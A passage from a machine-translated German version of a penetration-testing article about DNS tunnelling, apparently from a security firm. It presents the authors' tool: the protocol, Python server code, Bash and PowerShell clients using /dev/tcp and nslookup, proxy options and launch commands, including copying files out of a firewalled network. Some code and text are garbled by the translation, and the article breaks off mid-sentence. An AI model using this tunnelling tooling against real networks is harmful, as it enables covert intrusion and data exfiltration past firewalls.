<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üçÆ üë®‚Äç‚öïÔ∏è üíÆ Verkehr am Ende des Tunnels oder DNS im Pentest ü§∑üèø ü§ôüèª üìü</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hallo! In Penetrationstestprojekten sto√üen wir h√§ufig auf hart segmentierte Netzwerke, die fast vollst√§ndig von der Au√üenwelt isoliert sind. Um dieses...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Verkehr am Ende des Tunnels oder DNS im Pentest</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/fbk_cs/blog/432078/"><p><img src="https://habrastorage.org/webt/wj/uf/dd/wjufddhw28xxdtak6yot4xypigk.jpeg"></p><br><p>  Hallo!  In Penetrationstestprojekten sto√üen wir h√§ufig auf hart segmentierte Netzwerke, die fast vollst√§ndig von der Au√üenwelt isoliert sind.  Um dieses Problem zu l√∂sen, ist es manchmal erforderlich, den Datenverkehr √ºber das einzige verf√ºgbare Protokoll - DNS - weiterzuleiten.  In diesem Artikel erfahren Sie, wie Sie ein √§hnliches Problem im Jahr 2018 l√∂sen und welche Fallstricke dabei auftreten.  Beliebte Dienstprogramme werden ebenfalls √ºberpr√ºft und eine Version ihres eigenen Open-Source-Dienstprogramms mit Funktionen vorgestellt, die in vorhandenen √§hnlichen Tools normalerweise nicht vorhanden sind. </p><a name="habracut"></a><br><h1 id="chto-takoe-dns-tunneli">  Was sind DNS-Tunnel? </h1><br><p>  Es gibt bereits <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">mehrere</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Artikel</a> √ºber Habr√©, die erkl√§ren, was DNS-Tunneling ist.  Ein wenig Theorie zum DNS-Tunneling finden Sie jedoch unter dem Spoiler. </p><br><div class="spoiler">  <b class="spoiler_title">Was ist DNS-Tunneling?</b> <div class="spoiler_text"><p>  Es kommt vor, dass der Zugriff auf das Netzwerk durch die Firewall stark eingeschr√§nkt wird und Sie die Daten sehr schlecht √ºbertragen m√ºssen. Dann hilft die DNS-Tunneling-Technik. </p><br><p>  Im Diagramm sieht alles so aus: <br><img src="https://habrastorage.org/webt/bt/ax/w7/btaxw7-gmlbce6669ef_a3dmhzy.png"></p><br><p>  Abfragen f√ºr DNS werden selbst mit den strengsten Firewall-Einstellungen manchmal noch bestanden, und Sie k√∂nnen diese verwenden, indem Sie sie von Ihrem Server auf der anderen Seite beantworten.  Die Kommunikation wird extrem langsam sein, dies reicht jedoch aus, um in das lokale Netzwerk des Unternehmens einzudringen oder beispielsweise dringend √ºber kostenpflichtiges WLAN im Ausland auf das Internet zuzugreifen. </p></div></div><br><h1 id="chto-populyarno-na-dannyy-moment">  Was ist im Moment beliebt </h1><br><p>  Jetzt finden Sie im Internet viele Dienstprogramme zum Bedienen dieser Technik - jedes mit seinen eigenen Funktionen und Fehlern.  Wir haben die f√ºnf beliebtesten f√ºr Vergleichstests ausgew√§hlt: </p><br><ul><li>  dnscat2 </li><li>  Jod </li><li>  dns2tcp </li><li>  Heyoka </li><li>  OzymanDNS </li></ul><br><p>  Weitere Informationen dazu, wie wir sie getestet haben, finden Sie in unserem Artikel √ºber <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Hacker</a> .  Hier geben wir nur die Ergebnisse an. </p><br><p><img src="https://habrastorage.org/webt/jp/8m/ip/jp8mipmbbxog9uwevtoln1h2bh0.png"></p><br><p>  Wie Sie den Ergebnissen entnehmen k√∂nnen, k√∂nnen Sie arbeiten, aber unter dem Gesichtspunkt der Penetrationstests gibt es Nachteile: </p><br><ul><li>  kompilierte Clients - Auf Computern mit Virenschutzprogrammen ist es viel einfacher, etwas Interpretiertes auszuf√ºhren als eine Bin√§rdatei. </li><li>  instabile Arbeit unter Windows; </li><li>  die Notwendigkeit, in einigen F√§llen zus√§tzliche Software zu installieren. </li></ul><br><p>  Aufgrund dieser M√§ngel mussten wir unser eigenes Tool entwickeln, und so stellte sich heraus ... </p><br><h1 id="sozdaem-svoyu-utilitu-dlya-dns-tunnelirovaniya">  Erstellen Sie Ihr eigenes DNS-Tunneling-Dienstprogramm </h1><br><h2 id="predystoriya">  Hintergrund </h2><br><p>  Alles begann w√§hrend des internen Pentests einer Bank.  In der Lobby befand sich ein √∂ffentlicher Computer, auf dem Dokumente, Zertifikate und andere Papiere gedruckt wurden.  Unser Ziel: Um den gr√∂√ütm√∂glichen Nutzen aus einem Computer zu ziehen, auf dem Windows 7 ausgef√ºhrt wird, Kaspersky Anti-Virus an Bord hatte und nur auf bestimmte Seiten zugreifen konnte (gleichzeitig konnten DNS-Namen aufgel√∂st werden). </p><br><p>  Nachdem wir die erste Analyse durchgef√ºhrt und zus√§tzliche Daten vom Auto erhalten hatten, entwickelten wir mehrere Angriffsvektoren.  Die Pfade mit dem Betrieb der Maschine unter Verwendung von Bin√§rprogrammen wurden sofort zur Seite entfernt, da der "gro√üe und schreckliche" "Kaspersky" seine L√∂schung sofort erkannte, als er eine ausf√ºhrbare Datei entdeckte.  Es gelang uns jedoch, die M√∂glichkeit zu erhalten, Skripte im Auftrag des lokalen Administrators auszuf√ºhren. Danach war eine der Ideen nur die M√∂glichkeit, einen DNS-Tunnel zu erstellen. </p><br><p>  Auf der Suche nach m√∂glichen Methoden haben wir in PowerShell einen Client f√ºr dnscat2 gefunden (wir haben bereits dar√ºber geschrieben).  Am Ende konnten wir jedoch nur f√ºr kurze Zeit eine Verbindung herstellen, wonach der Client abst√ºrzte. </p><br><p>  Dies hat uns, gelinde gesagt, sehr ver√§rgert, da in dieser Situation die Anwesenheit eines interpretierten Klienten einfach notwendig war.  Dies war einer der Gr√ºnde f√ºr die Entwicklung eines eigenen Tools f√ºr das DNS-Tunneling. </p><br><h2 id="trebovaniya">  Anforderungen </h2><br><p>  Unsere Hauptanforderungen an uns selbst sind: </p><br><ul><li>  das Vorhandensein von universellen (soweit m√∂glich) und interpretierten Clients f√ºr Unix- und Windows-Systeme.  F√ºr Kunden wurden Bash und Powershell ausgew√§hlt.  In Zukunft ist ein Perl-Client f√ºr Unix geplant. </li><li>  die F√§higkeit, Datenverkehr von einer bestimmten Anwendung weiterzuleiten; </li><li>  Unterst√ºtzung f√ºr mehrere Clients f√ºr einen Benutzer. </li></ul><br><h2 id="arhitektura-proekta">  Projektarchitektur </h2><br><p>  Basierend auf den Anforderungen haben wir mit der Entwicklung begonnen.  Aus unserer Sicht besteht das Dienstprogramm aus drei Teilen: einem Client auf dem internen Computer, einem DNS-Server und einem kleinen Proxy zwischen der Pentester-Anwendung und dem DNS-Server. </p><br><p><img src="https://habrastorage.org/webt/mt/zo/oz/mtzoozi8lmpyme22arlwee_ty2o.png"></p><br><p>  Zun√§chst haben wir beschlossen, den Tunnel √ºber TXT-Datens√§tze weiterzuleiten. </p><br><p>  Das Funktionsprinzip ist ganz einfach: </p><br><ul><li>  Pentester startet einen DNS-Server. </li><li>  Ein Pentester (oder ein Benutzer √ºber Social Engineering) startet einen Client auf einem internen Computer.  Auf dem Client gibt es Parameter wie den Clientnamen und die Dom√§ne, und es besteht auch die M√∂glichkeit, die IP-Adresse des DNS-Servers direkt anzugeben. </li><li> Ein Pentester (von einem externen Netzwerk) startet einen Proxy, in dem er die IP-Adresse des DNS-Servers sowie den zu klopfenden Port, IP-Ziele (z. B. ssh im internen Netzwerk, in dem sich der Client befindet) und dementsprechend den Zielport angibt.  Au√üerdem ist eine Client-ID erforderlich, die durch Hinzuf√ºgen des Schl√ºssels <code>--clients</code> abgerufen werden kann. </li><li>  Pentester startet die f√ºr ihn interessante Anwendung und zeigt den Proxy-Port auf localhost. </li></ul><br><h2 id="protokol-obscheniya">  Kommunikationsprotokoll </h2><br><p>  Stellen Sie sich ein ziemlich einfaches Protokoll f√ºr die Kommunikation zwischen einem Server und einem Client vor. </p><br><h3 id="registraciya">  Registrierung </h3><br><p>  Wenn der Client gestartet wird, registriert er sich beim Server und fordert einen TXT-Datensatz √ºber eine Subdomain des folgenden Formats an: </p><br><p> <code>0&lt;7 random chars&gt;&lt;client name&gt;.&lt;your domain&gt;</code> </p> <br><p>  0 - Registrierungsschl√ºssel <br>  <code>&lt;7 random chars&gt;</code> - um das Zwischenspeichern von DNS-Eintr√§gen zu vermeiden <br>  <code>&lt;client name&gt;</code> - Der Name, der dem Client beim Start gegeben wurde <br>  <code>&lt;your domain&gt;</code> - Beispiel: xakep.ru <br>  Bei erfolgreicher Registrierung erh√§lt der Client eine Erfolgsmeldung in der TXT-Antwort sowie die ihm zugewiesene ID, die er weiterhin verwendet. </p><br><h3 id="osnovnoy-cikl">  Hauptzyklus </h3><br><p>  Nach der Registrierung beginnt der Client, den Server nach der Verf√ºgbarkeit neuer Daten im Format abzufragen </p><br><p> <code>1&lt;7 random chars&gt;&lt;id&gt;.&lt;your domain&gt;</code> </p> <br><p>  Wenn neue Daten vorhanden sind, werden sie in der TXT-Antwort im Format empfangen </p><br><p>  <code>&lt;id&gt;&lt;target ip&gt;:&lt;target port&gt;:&lt;data in base64&gt;</code> , andernfalls kommt <code>&lt;id&gt;ND</code> . </p><br><h3 id="cikl-zagruzki-dannyh">  Datenladezyklus </h3><br><p>  Der Client in einer Schleife pr√ºft, ob Daten von unserem <code>&lt;target&gt;</code> .  Wenn es eine Antwort gibt, lesen wir aus dem, was angekommen ist, einen Puffer der Gr√∂√üe N Kb, <code>250-&lt;len_of_your_domain&gt;-&lt;  &gt;</code> ihn in Bl√∂cke mit einer <code>250-&lt;len_of_your_domain&gt;-&lt;  &gt;</code> von <code>250-&lt;len_of_your_domain&gt;-&lt;  &gt;</code> und senden Daten blockweise im folgenden Format: <br> <code>2&lt;4randomchars&gt;&lt;id&gt;&lt;block_id&gt;.&lt;data&gt;.&lt;your_domain&gt;</code> </p> <br><p>  Wenn die Block√ºbertragung erfolgreich ist, erhalten wir einige Daten √ºber den √ºbertragenen Block. Wenn die Puffer√ºbertragung abgeschlossen ist, erhalten wir <code>ENDBLOCK</code> . </p><br><h2 id="dns-server">  DNS-Server </h2><br><p>  Der Tunnel-DNS-Server wurde in Python3 mithilfe der dnslib-Bibliothek geschrieben. Dadurch k√∂nnen Sie ganz einfach Ihren eigenen DNS-Resolver erstellen, indem Sie vom Objekt dnslib.ProxyResolver erben und die Methode resolve () √ºberschreiben. </p><br><p>  Mit Great DNSLIB k√∂nnen Sie sehr schnell Ihr eigenes Proxy-DNS erstellen: </p><br><div class="spoiler">  <b class="spoiler_title">Ein bisschen Servercode</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Resolver</span></span></span><span class="hljs-params"><span class="hljs-class"><span class="hljs-params">(ProxyResolver)</span></span></span><span class="hljs-class">:</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">__init__</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self, upstream)</span></span></span><span class="hljs-function">:</span></span> super().__init__(upstream, <span class="hljs-number"><span class="hljs-number">53</span></span>, <span class="hljs-number"><span class="hljs-number">5</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">resolve</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self, request, handler)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-comment"><span class="hljs-comment">#   domain_request = DOMAIN_REGEX.findall(str(request.q.qname)) type_name = QTYPE[request.q.qtype] if not domain_request: #  DNS ,     ,    : ,  google return super().resolve(request, handler) #  ,    result reply = request.reply() reply.add_answer(RR( rname=DNSLabel(str(request.q.qname)), rtype=QTYPE.TXT, rdata=dns.TXT(wrap(result, 255)), #      255 ,   ,   ttl=300 )) if reply.rr: return reply if __name__ == '__main__': port = int(os.getenv('PORT', 53)) upstream = os.getenv('UPSTREAM', '8.8.8.8') #       resolver = Resolver(upstream) udp_server = DNSServer(resolver, port=port) tcp_server = DNSServer(resolver, port=port, tcp=True) udp_server.start_thread() tcp_server.start_thread() try: while udp_server.isAlive(): sleep(1) except KeyboardInterrupt: pass</span></span></code> </pre> </div></div><br><p>  In resolve () definieren wir die Antworten auf DNS-Anfragen vom Client: Registrierung, Anfordern neuer Eintr√§ge, Postback-Daten und L√∂schen des Benutzers. </p><br><p>  Wir speichern Informationen √ºber Benutzer in der SQLite-Datenbank, die Daten-Zwischenablage befindet sich im RAM und hat die folgende Struktur, in der der Schl√ºssel die Client-Nummer ist: </p><br><pre> <code class="json hljs">{ { <span class="hljs-attr"><span class="hljs-attr">"target_ip"</span></span>: <span class="hljs-string"><span class="hljs-string">"192.168.1.2"</span></span>, # IP ‚Äú‚Äù -    <span class="hljs-attr"><span class="hljs-attr">"target_port"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span>, #  ‚Äú‚Äù <span class="hljs-attr"><span class="hljs-attr">"socket"</span></span>: None, #       <span class="hljs-attr"><span class="hljs-attr">"buffer"</span></span>: None, #      <span class="hljs-attr"><span class="hljs-attr">"upstream_buffer"</span></span>: b'' #      }, ... }</code> </pre> <br><p>  Um die Daten vom Pentester in den Puffer zu stellen, haben wir einen kleinen ‚ÄûEmpf√§nger‚Äú geschrieben, der in einem separaten Stream gestartet wird.  Es f√§ngt Verbindungen vom Pentester ab und f√ºhrt das Routing durch: an welchen Client Anforderungen gesendet werden sollen. </p><br><p>  Vor dem Starten des Servers muss der Benutzer nur einen Parameter festlegen: DOMAIN_NAME - den Namen der Dom√§ne, mit der der Server arbeiten wird. </p><br><h2 id="klient-na-bash">  Bash Client </h2><br><p>  Bash wurde zum Schreiben eines Clients f√ºr Unix-Systeme ausgew√§hlt, wie es in modernen Unix-Systemen am h√§ufigsten vorkommt.  Bash bietet die M√∂glichkeit, eine Verbindung √ºber / dev / tcp / herzustellen, auch mit nicht privilegierten Benutzerrechten. </p><br><p>  Wir werden nicht jeden Code im Detail analysieren, sondern nur die interessantesten Punkte betrachten. <br>  Das Prinzip des Kunden ist einfach.  F√ºr die Kommunikation mit DNS wird das Standarddienstprogramm <code>dig</code> verwendet.  Der Client registriert sich beim Server und beginnt danach im fortw√§hrenden Zyklus, Anforderungen unter Verwendung des zuvor beschriebenen Protokolls zu erf√ºllen.  Unter dem Spoiler mehr. </p><br><div class="spoiler">  <b class="spoiler_title">Lesen Sie mehr √ºber den Bash-Client</b> <div class="spoiler_text"><p>  Es wird gepr√ºft, ob eine Verbindung hergestellt wurde, und in diesem Fall wird die Antwortfunktion ausgef√ºhrt (Empfangene Daten vom Ziel lesen, aufteilen und an den Server senden). </p><br><p>  Danach wird gepr√ºft, ob neue Daten vom Server vorhanden sind.  Wenn sie gefunden werden, pr√ºfen wir, ob die Verbindung getrennt werden soll.  Die L√ºcke selbst tritt auf, wenn wir Informationen √ºber das Ziel mit IP 0.0.0.0 und Port 00 erhalten. In diesem Fall l√∂schen wir den Dateideskriptor (wenn er nicht ge√∂ffnet war, gibt es keine Probleme) und √§ndern die Ziel-IP auf die eingehende 0.0.0.0. </p><br><p>  Weiter unten im Code sehen wir, ob eine neue Verbindung hergestellt werden muss.  Sobald die folgenden Nachrichten uns Daten f√ºr das Ziel senden, √§ndern wir, falls die vorherige IP nicht mit der aktuellen √ºbereinstimmt (dies wird nach dem Zur√ºcksetzen der Fall sein), das Ziel in ein neues und stellen √ºber den Befehl <code>exec 3&lt;&gt;/dev/tcp/$ip/$port</code> eine Verbindung her <code>exec 3&lt;&gt;/dev/tcp/$ip/$port</code> , wobei <code>$ip</code> das Ziel ist, <code>$port</code> der Zielport. <br>  Wenn die Verbindung bereits hergestellt ist, wird das eingehende Datenelement dekodiert und fliegt √ºber den Befehl <code>echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3</code>  <code>echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3</code> , wobei <code>${data_array[2]}</code> ist, was wir vom Server erhalten haben. </p><br><pre> <code class="plaintext hljs">while : do if [[ $is_set = 'SET' ]] then reply fi data=$(get_data $id) if [[ ${data:0:2} = $id ]] then if [[ ${data:2:2} = 'ND' ]] then sleep 0.1 else IFS=':' read -r -a data_array &lt;&lt;&lt; $data data=${data_array[0]} is_id=${data:0:2} ip=${data:2} port=${data_array[1]} if [[ $is_id = $id ]] then if [[ $ip = '0.0.0.0' &amp;&amp; $port = '00' ]] then exec 3&lt;&amp;- exec 3&gt;&amp;- is_set='NOTSET' echo "Connection OFF" last_ip=$ip fi if [[ $last_ip != $ip ]] then exec 3&lt;&gt;/dev/tcp/$ip/$port is_set='SET' echo "Connection ON" last_ip=$ip fi if [[ $is_set = 'SET' ]] then echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3 fi fi fi fi done</code> </pre> <br><p>  Senden Sie nun die Antwortfunktion.  Zuerst lesen wir 2048 Bytes aus dem Deskriptor und codieren sie sofort durch <code>$(timeout 0.1 dd bs=2048 count=1 &lt;&amp;3 2&gt; /dev/null | base64 -w0</code> ).  Wenn die Antwort leer ist, verlassen wir die Funktion, andernfalls beginnen wir mit dem Teilen und Senden.  Beachten Sie, dass nach der Bildung der Anforderung zum Senden per Dig die Lieferung auf Erfolg gepr√ºft wird.  Wenn dies erfolgreich ist, beenden Sie den Zyklus, andernfalls versuchen Sie es, bis es funktioniert. </p><br><pre> <code class="plaintext hljs">reply() { response=$(timeout 0.1 dd bs=2048 count=1 &lt;&amp;3 2&gt; /dev/null | base64 -w0) if [[ $response != '' ]] then debug_echo 'Got response from target server ' response_len=${#response} number_of_blocks=$(( ${response_len} / ${MESSAGE_LEN})) if [[ $(($response_len % $MESSAGE_LEN)) = 0 ]] then number_of_blocks-=1 fi debug_echo 'Sending message back...' point=0 for ((i=$number_of_blocks;i&gt;=0;i--)) do blocks_data=${response:$point:$MESSAGE_LEN} if [[ ${#blocks_data} -gt 63 ]] then localpoint=0 while : do block=${blocks_data:localpoint:63} if [[ $block != '' ]] then dat+=$block. localpoint=$((localpoint + 63)) else break fi done blocks_data=$dat dat='' point=$((point + MESSAGE_LEN)) else blocks_data+=. fi while : do block=$(printf %03d $i) check_deliver=$(dig ${HOST} 2$(generate_random 4)$id$block.$blocks_data${DNS_DOMAIN} TXT | grep -oP '\"\K[^\"]+') if [[ $check_deliver = 'ENDBLOCK' ]] then debug_echo 'Message delivered!' break fi IFS=':' read -r -a check_deliver_array &lt;&lt;&lt; $check_deliver deliver_data=${check_deliver_array[0]} block_check=${deliver_data:2} if [[ ${check_deliver_array[1]} = 'OK' ]] &amp;&amp; [[ $((10#${deliver_data:2})) = $i ]] &amp;&amp; [[ ${deliver_data:0:2} = $id ]] then break fi done done else debug_echo 'Empty message from target server, forward the next package ' fi }</code> </pre> </div></div><br><h2 id="powershell-klient">  Powershell-Kunde: </h2><br><p>  Da wir vollst√§ndige Interpretierbarkeit ben√∂tigen und auf den meisten aktuellen Systemen arbeiten m√ºssen, ist der Basisclient f√ºr Windows das Standard-Dienstprogramm nslookup f√ºr die Kommunikation √ºber DNS und das System.Net.Sockets.TcpClient-Objekt zum Herstellen einer Verbindung im internen Netzwerk. </p><br><p>  Alles ist auch sehr einfach.  Jede Iteration der Schleife ist ein Aufruf des Befehls nslookup unter Verwendung des zuvor beschriebenen Protokolls. </p><br><p>  F√ºhren Sie zum Registrieren beispielsweise den folgenden Befehl aus, um sich zu registrieren: <br> <code>$text = &amp;nslookup -q=TXT $act$seed$clientname$Dot$domain $server 2&gt;$null</code> <br>  Wenn Fehler auftreten, werden sie nicht angezeigt und die Fehlerdeskriptorwerte an $ null gesendet. </p><br><p>  nslookup gibt uns eine √§hnliche Antwort zur√ºck: <br><img src="https://habrastorage.org/webt/xz/n9/wk/xzn9wkh45ds0pxmpykpo5xrhldc.png"></p><br><p>  Danach m√ºssen wir alle Zeilen in Anf√ºhrungszeichen setzen, f√ºr die wir sie mit einer regul√§ren Saison durchgehen: </p><br><p> <code>$text = [regex]::Matches($text, '"(.*)"') | %{$_.groups[1].value} | %{$_ -replace '([ "\t]+)',$('') }</code> </p> <br><p>  Jetzt k√∂nnen Sie die empfangenen Befehle verarbeiten. <br>  Jedes Mal, wenn sich die IP-Adresse des ‚ÄûOpfers‚Äú √§ndert, wird ein TCP-Client erstellt, eine Verbindung hergestellt und die Daten√ºbertragung beginnt.  Vom DNS-Server werden die Informationen base64-decodiert und Bytes an das Opfer gesendet.  Wenn das ‚ÄûOpfer‚Äú etwas beantwortet hat, codieren wir, teilen uns in Teile und f√ºhren nslookup-Anforderungen gem√§√ü dem Protokoll aus.  Das ist alles. <br>  Wenn Sie Strg + C dr√ºcken, wird eine Anforderung zum L√∂schen des Clients ausgef√ºhrt. </p><br><h2 id="proxy">  Proxy: </h2><br><p>  Der Proxy f√ºr den Pentester ist ein kleiner Proxyserver in Python3. </p><br><p><img src="https://habrastorage.org/webt/k4/lp/0u/k4lp0uzffo9oo90eqommsetwvn4.png"></p><br><p>  In den Parametern m√ºssen Sie die IP des DNS-Servers angeben, den Port, an dem eine Verbindung zum Server hergestellt werden soll. Die Option --clients gibt eine Liste der registrierten Clients zur√ºck. <code>--target - target ip</code> , <code>--target_port - target port</code> , <code>--client</code> - id des Clients, mit dem wir zusammenarbeiten Arbeit (gesehen nach Ausf√ºhrung von <code>--clients</code> ), - <code>--send_timeout</code> - Zeit√ºberschreitung f√ºr das Senden von Nachrichten aus der Anwendung. </p><br><p>  Beim Start mit dem Parameter <code>--clients</code> sendet der Proxy eine Anforderung im Format <code>\x00GETCLIENTS\n</code> an den Server. <br>  Wenn wir mit der Arbeit beginnen und eine Verbindung herstellen, senden wir eine Nachricht im Format <code>\x02RESET:client_id\n</code> , um die vorherige Verbindung zur√ºckzusetzen.  Nachdem wir Informationen zu unserem Ziel <code>\x01client_id:ip:port:\n</code> <br>  Wenn wir Nachrichten an den Client senden, senden wir au√üerdem Bytes im Format <code>\x03data</code> und senden einfach <code>\x03data</code> an die Anwendung. <br>  Au√üerdem unterst√ºtzt der Proxy den SOCKS5-Modus. </p><br><h2 id="kakie-trudnosti-mogut-vozniknut">  Welche Schwierigkeiten k√∂nnen auftreten? </h2><br><p>  Wie bei jedem Mechanismus kann das Dienstprogramm fehlschlagen.  Vergessen wir nicht, dass der DNS-Tunnel eine d√ºnne Sache ist und viele Faktoren seinen Betrieb beeinflussen k√∂nnen, von der Netzwerkarchitektur bis zur Qualit√§t der Verbindung zu Ihrem Produktionsserver. </p><br><p>  W√§hrend des Tests bemerkten wir gelegentlich kleine St√∂rungen.  Bei hohen <code>--send_timeout</code> , die √ºber ssh ausgef√ºhrt werden, lohnt es sich beispielsweise, den Parameter <code>--send_timeout</code> , da der Client sonst zu frieren beginnt.  Manchmal wird die Verbindung auch nicht beim ersten Mal hergestellt, sie kann jedoch einfach durch Neustart des Proxys behandelt werden, da die Verbindung w√§hrend der neuen Verbindung zur√ºckgesetzt wird.  Es gab auch Probleme mit der Dom√§nenaufl√∂sung bei der Arbeit mit Proxy-Ketten. Dies kann jedoch auch behoben werden, wenn Sie einen zus√§tzlichen Parameter f√ºr Proxy-Ketten angeben.  Es ist anzumerken, dass das Dienstprogramm derzeit nicht das Auftreten unn√∂tiger Anforderungen vom Zwischenspeichern von DNS-Servern steuert, sodass die Verbindung manchmal fehlschl√§gt. Dies wird jedoch erneut mit der oben beschriebenen Methode behandelt. </p><br><h2 id="zapusk">  Starten </h2><br><p>  Konfigurieren Sie NS-Eintr√§ge in der Dom√§ne: </p><br><p><img src="https://habrastorage.org/webt/_q/p4/er/_qp4erwn54g5nqqxmlnnquv1itk.png"></p><br><p>  Wir warten, bis der Cache aktualisiert ist (normalerweise bis zu 5 Stunden). </p><br><p>  Wir starten den Server: <br> <code>python3 ./server.py --domain oversec.ru</code> </p> <br><p>  Starten Sie den Client (Bash): <br> <code>bash ./bash_client.sh -d oversec.ru -n TEST1</code> </p> <br><p>  Wir starten den Client (Win): <br> <code>PS:&gt; ./ps_client.ps1 -domain oversec.ru -clientname TEST2</code> </p> <br><p>  Sehen wir uns die Liste der verbundenen Clients an: <br> <code>python3 ./proxy.py --dns 138.197.178.150 --dns_port 9091 --clients</code> </p> <br><p>  Starten Sie den Proxy: <br> <code>python3 ./proxy.py --dns 138.197.178.150 --dns_port 9091 --socks5 --localport 9090 --client 1</code> </p> <br><p>  Testen: </p><br><p>  Nachdem der Server und mindestens ein Client gestartet wurden, k√∂nnen wir auf den Proxy zugreifen, als w√§re es unser Remotecomputer. <br>  Versuchen wir, die folgende Situation zu simulieren: Ein Pentester m√∂chte eine Datei von einem Server aus dem lokalen Netzwerk einer durch eine Firewall gesch√ºtzten Organisation herunterladen. Mithilfe von Social-Engineering-Methoden konnte er einen DNS-Client zwingen, im Netzwerk ausgef√ºhrt zu werden und das SSH-Serverkennwort herauszufinden. </p><br><p>  Pentester startet auf seinem Computer einen Proxy, der den erforderlichen Client angibt, und kann dann √§hnliche Anrufe t√§tigen, die an den Client und vom Client an das lokale Netzwerk gesendet werden. <br> <code>scp -P9090 -C root@localhost:/root/dnserver.py test.kek</code> </p> <br><p>  Mal sehen, was passiert ist: </p><br><p><img src="https://habrastorage.org/webt/xd/un/ag/xdunagwddytfwinhgkcxxossnqi.png"></p><br><p>  Oben links sehen Sie die DNS-Abfragen, die an den Server gesendet werden, oben rechts - Proxy-Verkehr, unten links - Verkehr vom Client und unten rechts - unsere Anwendung.  Die Geschwindigkeit f√ºr den DNS-Tunnel erwies sich als recht anst√§ndig: 4,9 KBit / s bei Komprimierung. </p><br><p>  Beim Start ohne Komprimierung zeigte das Dienstprogramm eine Geschwindigkeit von 1,8 kb / s: </p><br><p><img src="https://habrastorage.org/webt/vs/lv/6o/vslv6oycbyicpppojlsbh2hs_hi.png"></p><br><p>  Schauen wir uns den DNS-Serververkehr genau an. Dazu verwenden wir das Dienstprogramm tcpdump. <br> <code>tcpdump -i eth0 udp port 53</code> </p> <br><p><img src="https://habrastorage.org/webt/oo/wx/pf/oowxpflehofc-dmyizrf6pwre08.png"></p><br><p>  Wir sehen, dass alles dem beschriebenen Protokoll entspricht: Der Client fragt den Server st√§ndig ab, ob er neue Daten f√ºr diesen Client hat, indem er Anforderungen der Form <code>1c6Zx9Vi39.oversec.ru</code> .  Wenn Daten vorhanden sind, antwortet der Server mit einer Reihe von TXT-Datens√§tzen, andernfalls% client_num% ND ( <code>39ND</code> ).  Der Client sendet Informationen an den Server , welche Arten von Abfragen mit <code>28sTx39003.MyNTYtZ2NtQG9wZW5zc2guY29tAAAAbGNoYWNoYTIwLXBvbHkxMzA1QG9wZW5zc.2guY29tLGFlczEyOC1jdHIsYWVzMTkyLWN0cixhZXMyNTYtY3RyLGFlczEyOC1n.Y21Ab3BlbnNzaC5jb20sYWVzMjU2LWdjbUBvcGVuc3NoLmNvbQAAANV1bWFjLTY.0LWV0bUBvcGVuc3NoLmNvbSx1bWFjLTEyOC1.oversec.ru.</code> </p><br><p>  In den folgenden Videos k√∂nnen Sie deutlich sehen, wie das Dienstprogramm in Verbindung mit meterpreter und im SOCKS5-Modus funktioniert. </p><br><iframe width="560" height="315" src="https://www.youtube.com/embed/N6Nm9mWFI6w" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><iframe width="560" height="315" src="https://www.youtube.com/embed/xSM-Dl1uo1k" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><h2 id="itog">  Das Ergebnis: </h2><br><p>  Lassen Sie uns ein wenig zusammenfassen.  Welche 